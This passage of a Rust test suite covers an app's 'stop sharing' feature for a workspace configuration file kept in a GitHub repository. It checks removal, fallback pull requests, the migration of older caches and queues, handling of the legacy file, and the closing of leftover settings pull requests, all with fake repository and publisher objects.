    assert_eq!(report.sharing, Some(SharingNote::StoppedBy { who: Some("example-teammate".into()) }));
    let cache = fx.cache().unwrap();
    assert!(cache.removed.is_none(), "no notice with choices");
    assert_eq!(cache.sharing.as_ref().unwrap().state, SharingState::KeptLocal);
    assert_eq!(cache.sharing.unwrap().who.as_deref(), Some("example-teammate"));
    assert_eq!(fx.ws().name, "Ply");
    // Said once.
    assert_eq!(fx.refresh(&repo).sharing, None);
}

#[test]
fn c1_stop_sharing_removes_the_file_and_this_computer_keeps_its_values() {
    let (fx, repo) = shared();
    fx.workspaces.rename(&fx.ws_id, "Renamed".into()).unwrap();
    record_local_edit_named(&fx.stores(), &repo, &fx.ws_id, false, Some("Renamed".into())).unwrap().unwrap();
    assert_eq!(fx.queue().fields.len(), 1);

    let remover = FakeRemover::default();
    let publisher = FakePublisher::default();
    let outcome = stop(&fx.stores(), &remover, &publisher, &fx.ws_id, 1_762_700_000).unwrap();
    assert_eq!(outcome, StopOutcome::Stopped { branch: "main".into(), closed: vec![], left_open: vec![] });
    assert_eq!(
        *remover.asked.borrow(),
        vec![("main".to_string(), "atelier/config-stop-sharing-1762700000".to_string())]
    );
    let cache = fx.cache().unwrap();
    assert!(cache.definition.is_none() && cache.removed.is_none() && cache.pending.is_empty());
    let sharing = cache.sharing.unwrap();
    assert_eq!((sharing.state, sharing.at, sharing.who), (SharingState::StoppedHere, 1_762_700_000, None));
    assert!(fx.queue().is_empty(), "the edit that waited stays here, not in the queue");
    assert_eq!(fx.ws().name, "Renamed");
    assert!(publisher.requests.borrow().is_empty());

    // The next read finds the file gone: nothing more to say or ask.
    repo.remove_by("main", DEFINITION_PATH, "test-owner", "c2");
    assert_eq!(fx.refresh(&repo).sharing, None);
    let cache = fx.cache().unwrap();
    assert!(cache.removed.is_none());
    assert_eq!(cache.sharing.unwrap().state, SharingState::StoppedHere);
    // And nothing to stop twice.
    assert!(stop(&fx.stores(), &remover, &publisher, &fx.ws_id, 1).is_err());
    assert_eq!(remover.asked.borrow().len(), 1);
}

#[test]
fn c1_stop_sharing_needs_a_shared_setup_and_write_access_and_leaves_all_as_it_was_on_a_failure() {
    // Not shared.
    let fx = Fixture::new();
    let remover = FakeRemover::default();
    let publisher = FakePublisher::default();
    assert!(stop(&fx.stores(), &remover, &publisher, &fx.ws_id, 1).is_err());
    // Read-only.
    let (fx, repo) = shared();
    *repo.permission.borrow_mut() = Some(false);
    fx.refresh(&repo);
    let said = stop(&fx.stores(), &remover, &publisher, &fx.ws_id, 1).unwrap_err();
    assert_eq!(said, "Stopping needs write access to the repository.");
    assert!(remover.asked.borrow().is_empty(), "nothing was tried");

    // Offline, and a failure: still shared, the queue's edits still wait.
    for (outcome, said) in [
        (RemovalOutcome::Unreachable("fatal: unable to access\ncould not resolve host: github.com".into()), "Plyloft couldn't reach GitHub (could not resolve host: github.com)."),
        (RemovalOutcome::Failed("main refused the push and the pull request branch too: denied".into()), "main refused the push and the pull request branch too: denied"),
    ] {
        let (fx, repo) = shared();
        fx.workspaces.rename(&fx.ws_id, "Renamed".into()).unwrap();
        record_local_edit_named(&fx.stores(), &repo, &fx.ws_id, false, Some("Renamed".into())).unwrap().unwrap();
        let remover = FakeRemover::then(outcome);
        assert_eq!(stop(&fx.stores(), &remover, &publisher, &fx.ws_id, 5).unwrap_err(), said);
        let cache = fx.cache().unwrap();
        assert!(cache.definition.is_some() && cache.sharing.is_none() && cache.removed.is_none());
        assert_eq!(fx.queue().fields.len(), 1);
        // The fallback's name is kept for the retry.
        assert_eq!(fx.queue().removal_branch.as_deref(), Some("atelier/config-stop-sharing-5"));
        let again = FakeRemover::default();
        stop(&fx.stores(), &again, &publisher, &fx.ws_id, 99).unwrap();
        assert_eq!(again.asked.borrow()[0].1, "atelier/config-stop-sharing-5");
    }
}

fn removal_pr(number: u64) -> PullRequest {
    PullRequest {
        number,
        url: format!("https://github.com/MatteoB-adv/atelier/pull/{number}"),
        branch: "atelier/config-stop-sharing-7".into(),
        head: Some("gone1".into()),
    }
}

#[test]
fn c1_a_refused_removal_waits_in_a_pull_request_and_the_setup_stays_shared() {
    let (fx, repo) = shared();
    let remover = FakeRemover::then(RemovalOutcome::PullRequest(removal_pr(231)));
    let publisher = FakePublisher::default();
    publisher.pr_states.borrow_mut().insert(231, PrState::Open);
    let outcome = stop(&fx.stores(), &remover, &publisher, &fx.ws_id, 7).unwrap();
    assert_eq!(
        outcome,
        StopOutcome::PullRequest { branch: "main".into(), number: 231, url: "https://github.com/MatteoB-adv/atelier/pull/231".into() }
    );
    assert!(fx.cache().unwrap().definition.is_some(), "still shared");
    assert_eq!(fx.queue().removal_pull_request.as_ref().map(|p| p.number), Some(231));
    // Pressed again while it waits: the same pull request, no second removal.
    assert_eq!(stop(&fx.stores(), &remover, &publisher, &fx.ws_id, 8).unwrap(), outcome);
    assert_eq!(remover.asked.borrow().len(), 1);
    // While it waits, the setup works as shared: an edit publishes.
    fx.workspaces.rename(&fx.ws_id, "Renamed".into()).unwrap();
    record_local_edit_named(&fx.stores(), &repo, &fx.ws_id, false, Some("Renamed".into())).unwrap().unwrap();
    *publisher.branch_text.borrow_mut() = Some(PLY_DEFINITION.to_string());
    let report = refresh_and_publish(&fx.stores(), &repo, &publisher, &fx.ws_id, RefreshMoment::Publish).unwrap();
    assert_eq!(report.sharing, None);
    assert_eq!(publisher.requests.borrow().len(), 1);
    assert_eq!(fx.queue().removal_pull_request.as_ref().map(|p| p.number), Some(231), "the wait survives a publish");
    // And a restart.
    let fx = fx.restart();
    assert_eq!(fx.queue().removal_pull_request.as_ref().map(|p| p.number), Some(231));
}

#[test]
fn c1_a_removal_pull_request_closed_without_merging_leaves_the_setup_shared() {
    let (fx, repo) = shared();
    let publisher = FakePublisher::default();
    publisher.pr_states.borrow_mut().insert(231, PrState::Open);
    stop(&fx.stores(), &FakeRemover::then(RemovalOutcome::PullRequest(removal_pr(231))), &publisher, &fx.ws_id, 7).unwrap();
    // GitHub can't say: it keeps waiting.
    publisher.pr_states.borrow_mut().clear();
    assert_eq!(settle(&fx.stores(), &publisher, &fx.ws_id, 9), None);
    assert!(fx.queue().removal_pull_request.is_some());

    publisher.pr_states.borrow_mut().insert(231, PrState::Closed);
    let report = refresh_and_publish(&fx.stores(), &repo, &publisher, &fx.ws_id, RefreshMoment::Periodic).unwrap();
    assert_eq!(report.sharing, Some(SharingNote::RemovalClosed { number: 231 }));
    assert!(fx.cache().unwrap().definition.is_some(), "the setup stays shared");
    assert!(fx.queue().removal_pull_request.is_none() && fx.queue().removal_branch.is_none());
    // Said once, and nothing is proposed again by itself.
    let report = refresh_and_publish(&fx.stores(), &repo, &publisher, &fx.ws_id, RefreshMoment::Periodic).unwrap();
    assert_eq!(report.sharing, None);
    assert!(publisher.requests.borrow().is_empty());
}

#[test]
fn c1_a_removal_pull_request_that_merged_is_stop_sharing_done() {
    let (fx, repo) = shared();
    let publisher = FakePublisher::default();
    publisher.pr_states.borrow_mut().insert(231, PrState::Open);
    stop(&fx.stores(), &FakeRemover::then(RemovalOutcome::PullRequest(removal_pr(231))), &publisher, &fx.ws_id, 7).unwrap();
    publisher.pr_states.borrow_mut().insert(231, PrState::Merged);
    repo.remove_by("main", DEFINITION_PATH, "example-teammate", "c2");
    let report = refresh_and_publish(&fx.stores(), &repo, &publisher, &fx.ws_id, RefreshMoment::Periodic).unwrap();
    assert_eq!(report.sharing, Some(SharingNote::Stopped { branch: "main".into(), closed: vec![], left_open: vec![] }));
    let cache = fx.cache().unwrap();
    assert!(cache.definition.is_none() && cache.removed.is_none(), "no notice on the computer that stopped");
    assert_eq!(cache.sharing.unwrap().state, SharingState::StoppedHere);
    assert!(fx.queue().is_empty());

    // The read sees the file gone before GitHub says "merged" (a page read
    // asks GitHub nothing): the same end.
    let (fx, repo) = shared();
    let publisher = FakePublisher::default();
    publisher.pr_states.borrow_mut().insert(231, PrState::Open);
    stop(&fx.stores(), &FakeRemover::then(RemovalOutcome::PullRequest(removal_pr(231))), &publisher, &fx.ws_id, 7).unwrap();
    repo.remove_by("main", DEFINITION_PATH, "example-teammate", "c2");
    let report = fx.refresh(&repo);
    assert_eq!(report.sharing, Some(SharingNote::Stopped { branch: "main".into(), closed: vec![], left_open: vec![] }));
    assert_eq!(fx.cache().unwrap().sharing.unwrap().state, SharingState::StoppedHere);
    assert!(fx.queue().removal_pull_request.is_none());
}

/// Migration: a cache and a queue 1.174.5 wrote read and behave as before.
#[test]
fn c1_a_cache_and_a_queue_1_174_5_wrote_read_and_behave_as_before() {
    let fx = Fixture::new();
    let dir = fx.configs.workspace_dir(&fx.ws_id);
    std::fs::create_dir_all(&dir).unwrap();
    std::fs::write(
        cache_path(&fx.configs, &fx.ws_id),
        r##"{ "schemaVersion": 1,
             "definition": { "schemaVersion": 1, "name": "Ply", "accentColor": "#7c3aed", "board": "githubIssues", "githubOwnerRepo": "MatteoB-adv/atelier" },
             "source": "repo", "branch": "main", "commit": "c1", "author": "example-teammate", "changedAt": 1700000000,
             "refreshedAt": 5, "unreadable": null,
             "pending": { "name": "Renamed" }, "pendingState": "pendingSync",
             "writeAccess": {} }"##,
    )
    .unwrap();
    std::fs::write(
        crate::shared_config::queue_path(&fx.configs, &fx.ws_id),
        r#"{ "schemaVersion": 1, "createDefinition": false,
             "fields": { "name": { "value": "Renamed", "base": "Ply", "queuedAt": 1, "attempts": 0 } },
             "lastError": null, "lastOffline": false, "createPullRequest": null,
             "pullRequestBranch": "atelier/config-name-1", "supersededPullRequests": [] }"#,
    )
    .unwrap();
    let cache = fx.cache().expect("a 1.174.5 cache reads");
    assert!(cache.removed.is_none() && cache.sharing.is_none());
    let queue = fx.queue();
    assert!(queue.removal_branch.is_none() && queue.removal_pull_request.is_none());
    assert_eq!(queue.fields.len(), 1);
    // Written back, the new fields aren't in the files.
    save_cache(&fx.configs, &fx.ws_id, &cache).unwrap();
    save_queue(&fx.configs, &fx.ws_id, &queue).unwrap();
    let text = std::fs::read_to_string(cache_path(&fx.configs, &fx.ws_id)).unwrap();
    assert!(!text.contains("removed") && !text.contains("sharing"), "{text}");
    let text = std::fs::read_to_string(crate::shared_config::queue_path(&fx.configs, &fx.ws_id)).unwrap();
    assert!(!text.contains("removal"), "{text}");

    // The file still on the branch: shared as before, and the edit publishes.
    fx.workspaces.rename(&fx.ws_id, "Renamed".into()).unwrap();
    let repo = FakeRepo::new();
    repo.put("main", DEFINITION_PATH, PLY_DEFINITION, "example-teammate", "c1");
    let publisher = FakePublisher::default();
    *publisher.branch_text.borrow_mut() = Some(PLY_DEFINITION.to_string());
    refresh_and_publish(&fx.stores(), &repo, &publisher, &fx.ws_id, RefreshMoment::Publish).unwrap();
    assert_eq!(publisher.requests.borrow().len(), 1);
    assert!(fx.cache().unwrap().definition.is_some());

    // The same 1.174.5 cache with the file gone from its branch: removed.
    repo.remove_by("main", DEFINITION_PATH, "example-teammate", "c9");
    fx.refresh(&repo);
    assert_eq!(fx.cache().unwrap().removed.unwrap().commit.as_deref(), Some("c9"));
}

// ── C1 round 2 ────────────────────────────────────────────────────────

fn queue_field(value: Value) -> QueuedField {
    QueuedField {
        conflict: None,
        use_mine: None,
        proposed: Vec::new(),
        value,
        base: Value::Null,
        base_commit: None,
        queued_at: 0,
        attempts: 0,
        last_error: None,
        pull_request: None,
    }
}

/// The blocker: an edit's publish never carries the cached copy to create
/// the file from — its own fetch may see a removal no refresh saw yet.
#[test]
fn c1r2_an_edit_never_gives_the_publish_a_copy_to_create_the_file_from() {
    let (fx, repo) = shared();
    fx.workspaces.rename(&fx.ws_id, "Renamed".into()).unwrap();
    record_local_edit_named(&fx.stores(), &repo, &fx.ws_id, false, Some("Renamed".into())).unwrap().unwrap();
    // The channel finds no file at the tip (A stopped sharing a moment ago).
    let publisher = FakePublisher::default()
        .then(PublishOutcome::Failed("main has no .atelier/workspace.json to change".into()));
    let report = publish_pending(&fx.stores(), &repo, &publisher, &fx.ws_id).unwrap().unwrap();
    assert_eq!(publisher.requests.borrow().len(), 1);
    assert!(publisher.requests.borrow()[0].2.is_none(), "no copy to create the file from");
    assert_eq!(report.error.as_deref(), Some("main has no .atelier/workspace.json to change"));
    assert!(fx.cache().unwrap().pending.contains_key("name"), "the edit waits");
    // The next read marks it removed; the edit stays here as this computer's value.
    repo.remove_by("main", DEFINITION_PATH, "example-teammate", "c2");
    fx.refresh(&repo);
    assert_eq!(fx.cache().unwrap().removed.unwrap().pending, vec!["name".to_string()]);
    assert_eq!(fx.ws().name, "Renamed");
}

#[test]
fn c1r2_a_queued_creation_and_a_move_to_another_branch_still_create_the_file() {
    // Share: the queue asks for the creation.
    let fx = Fixture::new();
    let repo = FakeRepo::new();
    repo.branches.borrow_mut().insert("main".into());
    crate::workspace_adoption::share(&fx.stores(), &repo, &fx.ws_id, "MatteoB-adv/atelier", 0).unwrap();
    let publisher = FakePublisher::default();
    publish_pending(&fx.stores(), &repo, &publisher, &fx.ws_id).unwrap().unwrap();
    assert!(publisher.requests.borrow()[0].2.is_some(), "Share creates it");

    // The definition read from main names staging: the edit goes there, and
    // the file is created there (the existing move).
    let fx = Fixture::new();
    let repo = FakeRepo::new();
    repo.branches.borrow_mut().insert("staging".into());
    repo.put(
        "main",
        DEFINITION_PATH,
        &PLY_DEFINITION.replace("\"name\": \"Ply\",", "\"name\": \"Ply\",\n  \"integrationBranch\": \"staging\","),
        "a",
        "c1",
    );
    fx.refresh(&repo);
    assert_eq!(fx.cache().unwrap().branch.as_deref(), Some("main"));
    fx.workspaces.set_accent_color(&fx.ws_id, Some("#0ea5e9".into())).unwrap();
    record_local_edit(&fx.stores(), &repo, &fx.ws_id, false).unwrap().unwrap();
    let publisher = FakePublisher::default();
    publish_pending(&fx.stores(), &repo, &publisher, &fx.ws_id).unwrap().unwrap();
    let requests = publisher.requests.borrow();
    assert_eq!(requests[0].0, "staging");
    assert!(requests[0].2.is_some(), "the move to the named branch creates it there");
}

/// The major: a computer that never read the shared setup finds only the
/// older file. The history says whether the setup was removed.
#[test]
fn c1r2_the_older_file_is_not_converted_by_itself_where_the_history_removed_the_setup() {
    let legacy_only = || {
        let fx = Fixture::new();
        let repo = FakeRepo::new();
        repo.put("main", LEGACY_PATH, PLY_LEGACY, "a", "c0");
        (fx, repo)
    };
    // Removed, by a commit git can name.
    let (fx, repo) = legacy_only();
    *repo.deleted.borrow_mut() = Some(Deletion::Deleted("c2".into(), Some("example-teammate".into()), Some(1_700_000_500)));
    let report = fx.refresh(&repo);
    assert!(!report.has_definition);
    let cache = fx.cache().expect("the removed state is kept");
    assert!(cache.definition.is_none(), "the older file is not taken: its conversion would publish the file back");
    let removed = cache.removed.clone().unwrap();
    assert_eq!((removed.branch.as_str(), removed.author.as_deref(), removed.at), ("main", Some("example-teammate"), Some(1_700_000_500)));
    let publisher = FakePublisher::default();
    refresh_and_publish(&fx.stores(), &repo, &publisher, &fx.ws_id, RefreshMoment::Open).unwrap();
    assert!(publisher.requests.borrow().is_empty());
    // "Keep it on this Mac" is remembered; "Share it again" is the press that creates it.
    keep_local(&fx.stores(), &fx.ws_id, 1).unwrap();
    fx.refresh(&repo);
    assert!(fx.cache().unwrap().removed.is_none() && fx.cache().unwrap().definition.is_none());
    crate::workspace_adoption::share(&fx.stores(), &repo, &fx.ws_id, "MatteoB-adv/atelier", 0).unwrap();
    assert!(fx.queue().create_definition);

    // Round 4: a history git can't read whole (a shallow clone) is not
    // "removed". The older file is left untaken, nothing converts by itself,
    // and the ordinary Share question shows.
    let (fx, repo) = legacy_only();
    *repo.deleted.borrow_mut() = Some(Deletion::CantSay);
    let report = fx.refresh(&repo);
    // Round 5: it is read (this computer runs on what the others have, and
    // is offered no Share that would replace it), and nothing converts by
    // itself; Settings keeps the press.
    assert!(report.has_definition);
    let cache = fx.cache().unwrap();
    assert_eq!(cache.source, DefinitionSource::Legacy);
    assert!(cache.definition.is_some() && cache.removed.is_none() && cache.sharing.is_none());
    assert!(cache.history_unread);
    assert!(!crate::workspace_adoption::may_convert_by_itself(&cache, false));
    assert_eq!(
        crate::workspace_adoption::shared_setup(Some(&cache), &fx.queue()),
        Some(crate::workspace_adoption::SharedSetup::OlderFile { read_only: false })
    );
    let publisher = FakePublisher::default();
    refresh_and_publish(&fx.stores(), &repo, &publisher, &fx.ws_id, RefreshMoment::Open).unwrap();
    assert!(publisher.requests.borrow().is_empty());
    // The press: nothing to forget, and the conversion is queued as a creation.
    crate::workspace_adoption::propose_again(&fx.stores(), &fx.ws_id).unwrap();
    queue_definition(&fx.stores(), &fx.ws_id).unwrap();
    assert!(fx.queue().create_definition);
    let mut queue = fx.queue();
    queue.create_definition = false;
    save_queue(&fx.configs, &fx.ws_id, &queue).unwrap();
    // Once git can answer "never", it is taken and converts as before.
    *repo.deleted.borrow_mut() = None;
    fx.refresh(&repo);
    let cache = fx.cache().unwrap();
    assert!(cache.definition.is_some() && !cache.history_unread);
    assert!(crate::workspace_adoption::may_convert_by_itself(&cache, false));

    // Never converted: taken and converted as before.
    let (fx, repo) = legacy_only();
    fx.refresh(&repo);
    let cache = fx.cache().unwrap();
    assert_eq!(cache.source, DefinitionSource::Legacy);
    assert!(cache.definition.is_some() && cache.removed.is_none());
    // Round 4: a computer already running on the older file is asked too.
    // Git can't say: it keeps what it has, and converts nothing by itself.
    *repo.deleted.borrow_mut() = Some(Deletion::CantSay);
    fx.refresh(&repo);
    let cache = fx.cache().unwrap();
    assert!(cache.definition.is_some() && cache.removed.is_none(), "nothing local changes on a guess");
    assert!(cache.history_unread);
    assert!(!crate::workspace_adoption::may_convert_by_itself(&cache, false));
    // It slept through a conversion and a removal: the history says so.
    *repo.deleted.borrow_mut() = Some(Deletion::Deleted("c9".into(), Some("example-teammate".into()), Some(1_700_000_500)));
    fx.refresh(&repo);
    let cache = fx.cache().unwrap();
    assert!(cache.definition.is_none(), "not converted back by a computer that missed the removal");
    assert_eq!(cache.removed.unwrap().commit.as_deref(), Some("c9"));
}

#[test]
fn c1r2_the_teams_suggested_models_go_into_this_computers_blank_rows_at_the_press() {
    let (fx, _repo) = shared();
    let mut team = crate::team_models::TeamModels::default();
    team.claude.builder = Some("claude-opus-5-5".into());
    team.claude.challenger = Some("claude-sonnet-5".into());
    team.codex.builder = Some("gpt-5.1-codex".into());
    team.codex.builder_reasoning = Some("high".into());
    crate::team_models::save(&fx.configs, &fx.ws_id, &team).unwrap();
    // This computer chose its own Reviewer, and the tool's own default for Codex's Builder.
    let mut own = crate::settings::WorkspaceModels::default();
    own.rows.claude.challenger = Some("claude-haiku-5".into());
    own.cli_default = vec!["codex.builder".into()];
    fx.workspaces.set_models(&fx.ws_id, Some(own)).unwrap();

    stop(&fx.stores(), &FakeRemover::default(), &FakePublisher::default(), &fx.ws_id, 5).unwrap();
    let kept = fx.workspaces.models_for(&fx.ws_id).unwrap();
    assert_eq!(kept.rows.claude.builder.as_deref(), Some("claude-opus-5-5"), "the suggestion it ran on");
    assert_eq!(kept.rows.claude.challenger.as_deref(), Some("claude-haiku-5"), "its own choice stays");
    assert_eq!(kept.rows.codex.builder, None, "the tool's own default stays chosen");
    assert_eq!(kept.rows.codex.builder_reasoning.as_deref(), Some("high"));
    assert!(kept.forces_cli_default("codex.builder"));

    // The same at a removal someone else made; nothing suggested, nothing written.
    let (fx, repo) = shared();
    crate::team_models::save(&fx.configs, &fx.ws_id, &team).unwrap();
    repo.remove_by("main", DEFINITION_PATH, "example-teammate", "c2");
    fx.refresh(&repo);
    assert_eq!(fx.workspaces.models_for(&fx.ws_id).unwrap().rows.claude.builder.as_deref(), Some("claude-opus-5-5"));
    let (fx, repo) = shared();
    repo.remove_by("main", DEFINITION_PATH, "example-teammate", "c2");
    fx.refresh(&repo);
    assert!(fx.workspaces.models_for(&fx.ws_id).is_none());
}

#[test]
fn c1r2_this_computers_open_settings_pull_requests_are_named_not_forgotten() {
    let waiting = |fx: &Fixture| {
        let mut queue = fx.queue();
        let mut f = queue_field(Value::from("#0ea5e9"));
        f.pull_request = Some(removal_pr(15));
        queue.fields.insert("accentColor".into(), f);
        queue.superseded_pull_requests.push(removal_pr(12));
        save_queue(&fx.configs, &fx.ws_id, &queue).unwrap();
    };
    // Pressed here, GitHub refuses the close: named as left open.
    let (fx, _repo) = shared();
    waiting(&fx);
    let publisher = FakePublisher::default();
    publisher.close_fails.set(true);
    let outcome = stop(&fx.stores(), &FakeRemover::default(), &publisher, &fx.ws_id, 5).unwrap();
    assert_eq!(outcome, StopOutcome::Stopped { branch: "main".into(), closed: vec![], left_open: vec![12, 15] });
    assert_eq!(fx.cache().unwrap().sharing.unwrap().left_open, vec![12, 15]);
    // At a removal someone else made nothing is closed: kept with the
    // notice, and with the answer.
    let (fx, repo) = shared();
    waiting(&fx);
    repo.remove_by("main", DEFINITION_PATH, "example-teammate", "c2");
    fx.refresh(&repo);
    assert_eq!(fx.cache().unwrap().removed.unwrap().left_open, vec![12, 15]);
    keep_local(&fx.stores(), &fx.ws_id, 1).unwrap();
    assert_eq!(fx.cache().unwrap().sharing.unwrap().left_open, vec![12, 15]);
}

#[test]
fn c1r2_a_member_found_to_have_no_push_keeps_the_removed_setup_and_is_told_once() {
    let (fx, repo) = shared();
    repo.remove_by("main", DEFINITION_PATH, "example-teammate", "c2");
    fx.refresh(&repo);
    assert!(fx.cache().unwrap().removed.is_some(), "write access wasn't known: the choice is offered");
    let said = crate::stop_sharing::keep_for_reader(&fx.stores(), &fx.ws_id, 9);
    assert_eq!(said, Some(SharingNote::StoppedBy { who: Some("example-teammate".into()) }));
    let cache = fx.cache().unwrap();
    assert!(cache.removed.is_none() && cache.write_access.read_only());
    assert_eq!(cache.sharing.unwrap().state, SharingState::KeptLocal);
    assert_eq!(crate::stop_sharing::keep_for_reader(&fx.stores(), &fx.ws_id, 9), None, "said once");
}

#[test]
fn c1r2_a_fallback_whose_names_are_used_up_starts_a_fresh_one_at_the_next_press() {
    let (fx, _repo) = shared();
    let used_up = crate::shared_config::names_used_up("atelier/config-stop-sharing-5");
    let remover = FakeRemover::then(RemovalOutcome::Failed(used_up.clone()));
    let publisher = FakePublisher::default();
    assert_eq!(stop(&fx.stores(), &remover, &publisher, &fx.ws_id, 5).unwrap_err(), used_up);
    assert_eq!(fx.queue().removal_branch, None);
    let again = FakeRemover::default();
    stop(&fx.stores(), &again, &publisher, &fx.ws_id, 99).unwrap();
    assert_eq!(again.asked.borrow()[0].1, "atelier/config-stop-sharing-99");
}

/// Round 2: the definition names `staging`, and `main` holds a copy (staging
/// was merged). *Stop sharing* removes it from staging: the copy on main is
/// not the shared setup, and no edit may put the file back on staging.
#[test]
fn c1r2_a_copy_left_on_another_branch_does_not_bring_a_removed_setup_back() {
    let named = PLY_DEFINITION.replace("\"name\": \"Ply\",", "\"name\": \"Ply\",\n  \"integrationBranch\": \"staging\",");
    let fx = Fixture::new();
    let repo = FakeRepo::new();
    repo.put("main", DEFINITION_PATH, &named, "a", "c1");
    repo.put("staging", DEFINITION_PATH, &named, "a", "c1");
    fx.refresh(&repo);
    fx.refresh(&repo);
    assert_eq!(fx.cache().unwrap().branch.as_deref(), Some("staging"));

    repo.remove_by("staging", DEFINITION_PATH, "example-teammate", "c2");
    *repo.deleted.borrow_mut() = Some(Deletion::Deleted("c2".into(), Some("example-teammate".into()), Some(1_700_000_500)));
    let report = fx.refresh(&repo);
    assert!(!report.has_definition, "main's copy is not taken");
    let cache = fx.cache().unwrap();
    assert!(cache.definition.is_none());
    assert_eq!(cache.removed.as_ref().map(|r| (r.branch.as_str(), r.author.as_deref())), Some(("staging", Some("example-teammate"))));
    fx.workspaces.rename(&fx.ws_id, "Renamed".into()).unwrap();
    assert!(record_local_edit(&fx.stores(), &repo, &fx.ws_id, false).unwrap().is_none());
    let publisher = FakePublisher::default();
    refresh_and_publish(&fx.stores(), &repo, &publisher, &fx.ws_id, RefreshMoment::Publish).unwrap();
    assert!(publisher.requests.borrow().is_empty());
    // Answered: not asked again while main still holds its copy.
    keep_local(&fx.stores(), &fx.ws_id, 1).unwrap();
    fx.refresh(&repo);
    let cache = fx.cache().unwrap();
    assert!(cache.removed.is_none() && cache.definition.is_none());
    assert_eq!(cache.sharing.unwrap().state, SharingState::KeptLocal);
    // "Share it again" creates it, and the read that follows doesn't undo the press.
    crate::workspace_adoption::share(&fx.stores(), &repo, &fx.ws_id, "MatteoB-adv/atelier", 0).unwrap();
    assert!(fx.queue().create_definition);
    fx.refresh(&repo);
    assert!(fx.queue().create_definition && fx.cache().unwrap().definition.is_some());

    // A computer that never read the setup finds only main's copy: the same.
    let fx = Fixture::new();
    fx.refresh(&repo);
    let cache = fx.cache().unwrap();
    assert!(cache.definition.is_none() && cache.removed.is_some());

    // A branch that never had the file is the move, as before.
    let fx = Fixture::new();
    *repo.deleted.borrow_mut() = None;
    fx.refresh(&repo);
    assert!(fx.cache().unwrap().definition.is_some());
    fx.workspaces.set_accent_color(&fx.ws_id, Some("#0ea5e9".into())).unwrap();
    record_local_edit(&fx.stores(), &repo, &fx.ws_id, false).unwrap().unwrap();
    let publisher = FakePublisher::default();
    publish_pending(&fx.stores(), &repo, &publisher, &fx.ws_id).unwrap().unwrap();
    assert!(publisher.requests.borrow()[0].2.is_some());
    // …but not when that branch's history removed it and no read said so yet.
    let fx = Fixture::new();
    fx.refresh(&repo);
    fx.workspaces.set_accent_color(&fx.ws_id, Some("#0ea5e9".into())).unwrap();
    record_local_edit(&fx.stores(), &repo, &fx.ws_id, false).unwrap().unwrap();
    for answer in [
        Deletion::Deleted("c2".into(), None, None),
        // Round 4: nor when git can't say — nothing is created on a guess.
        Deletion::CantSay,
    ] {
        *repo.deleted.borrow_mut() = Some(answer);
        let publisher = FakePublisher::default()
            .then(PublishOutcome::Failed("staging has no .atelier/workspace.json to change".into()));
        publish_pending(&fx.stores(), &repo, &publisher, &fx.ws_id).unwrap().unwrap();
        assert!(publisher.requests.borrow()[0].2.is_none(), "no copy to create it from");
    }
    // The question carries the commit that wrote the copy read, so a removal
    // older than that copy doesn't count.
    assert_eq!(repo.asked_since.borrow().last().unwrap().as_deref(), Some("c1"));

    // Round 4: git can't say whether the named branch's history removed the
    // file (a shallow clone). The copy keeps being used: nothing is dropped
    // and nothing is said removed.
    let fx = Fixture::new();
    *repo.deleted.borrow_mut() = Some(Deletion::CantSay);
    let report = fx.refresh(&repo);
    assert!(report.has_definition);
    let cache = fx.cache().unwrap();
    assert!(cache.definition.is_some() && cache.removed.is_none() && !cache.history_unread);
}

// ── C1 round 3 (owner, 2026-11-09): this computer's own settings pull
// requests are closed once Stop sharing has really taken the file away ──

/// A queue following settings pull requests #12 (superseded), #15 (a field)
/// and #18 (a field, merged meanwhile).
fn following(fx: &Fixture) {
    let mut queue = fx.queue();
    for (key, number) in [("accentColor", 15), ("name", 18)] {
        let mut f = queue_field(Value::from("x"));
        f.pull_request = Some(removal_pr(number));
        queue.fields.insert(key.into(), f);
    }
    queue.superseded_pull_requests.push(removal_pr(12));
    save_queue(&fx.configs, &fx.ws_id, &queue).unwrap();
}

#[test]
fn c1r3_the_press_closes_this_computers_open_settings_pull_requests_once_the_file_is_gone() {
    let (fx, _repo) = shared();
    following(&fx);
    let publisher = FakePublisher::default();
    publisher.pr_states.borrow_mut().insert(12, PrState::Open);
    publisher.pr_states.borrow_mut().insert(15, PrState::Open);
    publisher.pr_states.borrow_mut().insert(18, PrState::Merged);
    let outcome = stop(&fx.stores(), &FakeRemover::default(), &publisher, &fx.ws_id, 5).unwrap();
    assert_eq!(outcome, StopOutcome::Stopped { branch: "main".into(), closed: vec![12, 15], left_open: vec![] });
    assert_eq!(*publisher.closed.borrow(), vec![12, 15], "the one that merged meanwhile is left as it is");
    let sharing = fx.cache().unwrap().sharing.unwrap();
    assert!(sharing.left_open.is_empty() && sharing.to_close.is_empty());
    assert!(fx.queue().is_empty());
}

#[test]
fn c1r3_nothing_is_closed_while_the_removal_only_waits_in_its_pull_request() {
    let (fx, repo) = shared();
    following(&fx);
    let publisher = FakePublisher::default();
    for n in [12, 15, 18, 231] {
        publisher.pr_states.borrow_mut().insert(n, PrState::Open);
    }
    let remover = FakeRemover::then(RemovalOutcome::PullRequest(removal_pr(231)));
    stop(&fx.stores(), &remover, &publisher, &fx.ws_id, 7).unwrap();
    assert!(publisher.closed.borrow().is_empty(), "the setup is still shared: so are its pull requests");
    assert_eq!(fx.queue().fields.len(), 2, "still followed");

    // Closed without merging: the setup stays shared and nothing was closed.
    publisher.pr_states.borrow_mut().insert(231, PrState::Closed);
    assert_eq!(settle(&fx.stores(), &publisher, &fx.ws_id, 9), Some(SharingNote::RemovalClosed { number: 231 }));
    assert!(publisher.closed.borrow().is_empty());
    assert_eq!(fx.queue().fields.len(), 2);
    assert_eq!(fx.queue().superseded_pull_requests.len(), 1);

    // Pressed again, and this time it merges: closed then — never the
    // removal's own pull request.
    let remover = FakeRemover::then(RemovalOutcome::PullRequest(removal_pr(232)));
    publisher.pr_states.borrow_mut().insert(232, PrState::Open);
    stop(&fx.stores(), &remover, &publisher, &fx.ws_id, 10).unwrap();
    publisher.pr_states.borrow_mut().insert(232, PrState::Merged);
    repo.remove_by("main", DEFINITION_PATH, "example-teammate", "c2");
    let report = refresh_and_publish(&fx.stores(), &repo, &publisher, &fx.ws_id, RefreshMoment::Periodic).unwrap();
    assert_eq!(
        report.sharing,
        Some(SharingNote::Stopped { branch: "main".into(), closed: vec![12, 15, 18], left_open: vec![] })
    );
    assert_eq!(*publisher.closed.borrow(), vec![12, 15, 18]);
    assert!(!publisher.closed.borrow().contains(&232));
}

#[test]
fn c1r3_a_read_that_sees_the_removal_land_first_leaves_the_close_to_the_next_one_that_can_ask_github() {
    let (fx, repo) = shared();
    following(&fx);
